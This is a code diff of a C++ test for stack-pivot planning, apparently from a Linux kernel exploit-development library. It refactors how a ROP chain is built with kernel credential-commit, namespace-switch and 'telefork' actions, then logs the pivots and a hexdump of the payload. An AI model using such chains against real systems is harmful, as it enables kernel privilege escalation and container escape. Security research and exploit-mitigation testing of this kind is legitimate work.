@@ -7,8 +7,8 @@
 #include "test/TestSuite.cpp"
 #include "test/TestUtils.cpp"
 #include "util/HexDump.cpp"
-#include "util/Payload.cpp"
-#include "util/RopChain.cpp"
+#include "payloads/Payload.cpp"
+#include "payloads/RopChain.cpp"
 #include "util/stdutils.cpp"
 
 class PivotTests: public TestSuite {
@@ -69,10 +69,10 @@ public:
         auto kaslr_base = 0xffffffff81000000;
         auto target = lts6181;
 
-        RopChain rop(kaslr_base);
-        target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-        target.AddRopAction(rop, RopActionId::SWITCH_TASK_NAMESPACES, { 1 });
-        target.AddRopAction(rop, RopActionId::TELEFORK, { 5000 });
+        RopChain rop(target, kaslr_base);
+        rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
+        rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, { 1 });
+        rop.AddRopAction(RopActionId::TELEFORK, { 5000 });
 
         Payload payload(256);
         // Make the layout a bit more complex, so we block the planner to pivot to buf+0x00, but
@@ -93,7 +93,7 @@ public:
 
         for (auto& shift : rop_pivot.stack_shift.stack_shifts)
             Log("Stack jump @0x%lx: 0x%lx -> 0x%lx (size: 0x%lx)", shift.pivot.address,
-                shift.from_offset, shift.from_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);
+                shift.ret_offset, shift.ret_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);
 
         Log("Final ROP chain offset: 0x%lx", rop_pivot.rop_offset);
         Log("Final payload:\n%s", HexDump::Dump(payload.GetUsedData()).c_str());
